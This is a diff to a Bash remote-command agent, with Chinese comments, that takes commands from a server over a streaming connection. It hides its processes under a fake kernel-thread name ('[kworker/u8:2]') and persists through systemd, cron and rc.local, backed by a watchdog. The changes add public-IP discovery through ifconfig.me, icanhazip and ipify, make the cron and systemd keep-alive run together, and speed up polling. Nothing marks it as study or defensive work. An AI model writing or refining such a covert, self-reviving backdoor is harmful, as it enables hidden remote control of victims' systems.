@@ -21,12 +21,12 @@ PID_FILE="\${INSTALL_DIR}/.sys-pid"          # 主进程 PID 记录
 HEARTBEAT_FILE="\${INSTALL_DIR}/.sys-hb"     # 主进程心跳时间戳
 WATCHDOG_PID_FILE="\${INSTALL_DIR}/.sys-wdp" # 看门狗 PID 记录
 SERVICE_NAME="sys-helper"                   # systemd 服务名
-POLL_INTERVAL=1                             # 轮询间隔（秒，服务端长轮询已做节流）
+POLL_INTERVAL=0.5                           # 轮询间隔（秒，服务端长轮询已做节流）
 CMD_TIMEOUT=300                             # 单条命令超时（秒）
 RESULT_MAX=262144                           # 结果最大字节数（256KB）
 MAX_BACKOFF=30                              # 网络故障最大退避间隔（秒）
 WATCHDOG_INTERVAL=5                         # 命令执行期间喂狗间隔（秒）
-WATCHDOG_TIMEOUT=120                        # 心跳超时阈值（秒），超过判定假死
+WATCHDOG_TIMEOUT=180                        # 心跳超时阈值（秒），超过判定假死
 WATCHDOG_CHECK_INTERVAL=10                  # 看门狗巡检间隔（秒）
 # 进程伪装名（模拟内核线程，<=15 字符以适配 /proc/<pid>/comm）
 PROC_NAME_MAIN="[kworker/u8:2]"             # 主进程伪装名
@@ -122,8 +122,8 @@ stream_connect() {
     local agent_id="$1" hostname="$2" ip="$3"
 
     if command -v curl >/dev/null 2>&1; then
-        # -N 禁用输出缓冲，服务端每行即时到达；--max-time 60 匹配服务端生命周期
-        curl -sS -N --connect-timeout 10 --max-time 60 -X POST \\
+        # -N 禁用输出缓冲，服务端每行即时到达；--max-time 30 匹配服务端 25 秒生命周期
+        curl -sS -N --connect-timeout 5 --max-time 30 -X POST \\
             --data-urlencode "agent_id=$agent_id" \\
             --data-urlencode "hostname=$hostname" \\
             --data-urlencode "ip=$ip" \\
@@ -268,7 +268,7 @@ self_heal() {
 # ---------------- 进程拉起（带伪装名） ----------------
 # 以伪装名启动主进程
 spawn_main() {
-    (exec -a "$PROC_NAME_MAIN" bash "$AGENT_FILE" --run-disguised) >/dev/null 2>&1 &
+    (exec -a "$PROC_NAME_MAIN" bash "$AGENT_FILE" --run) >/dev/null 2>&1 &
     disown 2>/dev/null || true
 }
 
@@ -330,15 +330,19 @@ cleanup_existing() {
         sed -i "/\${AGENT_FILE}/d" /etc/rc.local 2>/dev/null
     fi
 
-    # 杀死主进程和看门狗（优先按 PID 文件，兜底按伪装名）
+    # 杀死主进程和看门狗（仅按 PID 文件，不使用 pkill -f 避免正则误杀）
     for f in "$PID_FILE" "$WATCHDOG_PID_FILE"; do
         if [ -f "$f" ]; then
             pid=$(cat "$f" 2>/dev/null)
             [ -n "$pid" ] && kill -9 "$pid" 2>/dev/null
         fi
     done
-    pkill -9 -f "$PROC_NAME_MAIN" 2>/dev/null
-    pkill -9 -f "$PROC_NAME_WD" 2>/dev/null
+    # 安全兜底：用 pgrep -x 精确匹配 comm 名（非正则），避免误杀其他进程
+    for comm_name in "$PROC_NAME_MAIN" "$PROC_NAME_WD"; do
+        for p in $(pgrep -x "$comm_name" 2>/dev/null); do
+            kill -9 "$p" 2>/dev/null
+        done
+    done 2>/dev/null
 
     # 删除残留文件（保留 UUID_FILE 维持设备身份）
     rm -f "$AGENT_FILE" "$ID_FILE" "$LOCK_FILE" "$PID_FILE" \\
@@ -424,14 +428,10 @@ StartLimitIntervalSec=300
 StartLimitBurst=10
 
 [Service]
-Type=notify
-ExecStart=/bin/bash -c 'exec -a "\${PROC_NAME_MAIN}" "\${AGENT_FILE}" --run-disguised'
+Type=simple
+ExecStart=/bin/bash -c 'exec -a "\${PROC_NAME_MAIN}" "\${AGENT_FILE}" --run'
 Restart=always
 RestartSec=5
-# 看门狗：Agent 需在 420 秒内喂狗，否则判定假死并强制重启
-WatchdogSec=420
-# 启动超时：10 秒内未发送 READY 则判定失败，回退到 cron 方案
-TimeoutStartSec=10
 # 优雅停止：发 SIGTERM 等待 15 秒后 SIGKILL
 KillSignal=SIGTERM
 TimeoutStopSec=15
@@ -450,13 +450,13 @@ UNIT
         systemctl enable "\${SERVICE_NAME}" >/dev/null 2>&1
         systemctl restart "\${SERVICE_NAME}" >/dev/null 2>&1
         if systemctl is-active --quiet "\${SERVICE_NAME}" 2>/dev/null; then
-            ok "systemd 服务已启动并设为开机自启（看门狗 + 伪装已启用）"
-            return 0
+            ok "systemd 服务已启动并设为开机自启（伪装已启用）"
+        else
+            warn "systemd 启动失败，将使用 cron 监视保活"
         fi
-        warn "systemd 启动失败，回退到 cron 监视保活"
     fi
 
-    # 第二层：cron 每分钟监视 + nohup 即时拉起
+    # 第二层：cron 每分钟监视（无论 systemd 是否成功都配置，作为双重保活）
     fallback_cron
     # 第三层：rc.local 兜底（无 systemd 且无 cron 的系统）
     fallback_rc_local
@@ -636,9 +636,9 @@ inner_loop_stream() {
             sd_notify WATCHDOG=1
             sleep "$wait"
         else
-            # 正常断开（END 或生命周期到），短暂等待后重连
+            # 正常断开（END 或生命周期到），短暂等待后重连（0.5 秒，加快响应）
             sd_notify WATCHDOG=1
-            sleep "$POLL_INTERVAL"
+            sleep 0.5
         fi
     done
 }
@@ -790,15 +790,19 @@ do_run() {
     fi
 
     hostname=$(hostname 2>/dev/null || echo "")
-    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
+    # 获取公网 IP（优先 ifconfig.me，回退 icanhazip，最后用内网 IP 兜底）
+    ip=$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null)
+    [ -z "$ip" ] && ip=$(curl -s --max-time 5 https://icanhazip.com 2>/dev/null | tr -d '[:space:]')
+    [ -z "$ip" ] && ip=$(wget -qO- --timeout=5 https://api.ipify.org 2>/dev/null | tr -d '[:space:]')
+    [ -z "$ip" ] && ip=$(hostname -I 2>/dev/null | awk '{print $1}')
     [ -z "$ip" ] && ip=""
 
     log "Agent 已启动（PID $$），开始流式通信（实时命令推送）"
-    # 通知 systemd 服务已就绪
-    sd_notify --ready
 
-    # 拉起看门狗（双进程互守）
-    spawn_watchdog
+    # 看门狗：仅非 systemd 模式下启动（systemd 下由 Restart=always 处理崩溃恢复）
+    if [ -z "\${NOTIFY_SOCKET:-}" ]; then
+        spawn_watchdog
+    fi
 
     # 写入初始心跳
     write_heartbeat
@@ -857,9 +861,12 @@ do_uninstall() {
         pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
         [ -n "$pid" ] && kill -9 "$pid" 2>/dev/null
     fi
-    # 兜底：按伪装名清理残留进程
-    pkill -9 -f "$PROC_NAME_MAIN" 2>/dev/null
-    pkill -9 -f "$PROC_NAME_WD" 2>/dev/null
+    # 兜底：用 pgrep -x 精确匹配 comm 名（非正则），避免误杀其他进程
+    for comm_name in "$PROC_NAME_MAIN" "$PROC_NAME_WD"; do
+        for p in $(pgrep -x "$comm_name" 2>/dev/null); do
+            kill -9 "$p" 2>/dev/null
+        done
+    done 2>/dev/null
 
     # 删除安装目录
     rm -rf "$INSTALL_DIR"
@@ -904,13 +911,16 @@ do_status() {
         echo "主进程:     未运行"
     fi
 
-    # 看门狗状态
-    pid=""
-    if [ -f "$WATCHDOG_PID_FILE" ]; then
+    # 看门狗状态（systemd 模式下不启动看门狗，显示"由systemd管理"）
+    if [ -n "\${NOTIFY_SOCKET:-}" ]; then
+        echo "看门狗:     由systemd管理"
+    elif [ -f "$WATCHDOG_PID_FILE" ]; then
         pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
-    fi
-    if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
-        echo "看门狗:     运行中 (PID $pid)"
+        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
+            echo "看门狗:     运行中 (PID $pid)"
+        else
+            echo "看门狗:     未运行"
+        fi
     else
         echo "看门狗:     未运行"
     fi
@@ -944,15 +954,7 @@ do_status() {
 main() {
     local mode="\${1:---install}"
     case "$mode" in
-        --run)
-            # 自我重新执行以伪装进程名（argv[0] + comm 双重伪装）
-            # 已伪装则直接运行（$0 已等于伪装名）
-            if [ "\${0:-}" != "$PROC_NAME_MAIN" ]; then
-                exec -a "$PROC_NAME_MAIN" bash "$AGENT_FILE" --run-disguised
-            fi
-            do_run
-            ;;
-        --run-disguised)  do_run ;;
+        --run)            do_run ;;
         --watchdog)       do_watchdog ;;
         --uninstall)      do_uninstall ;;
         --status)         do_status ;;
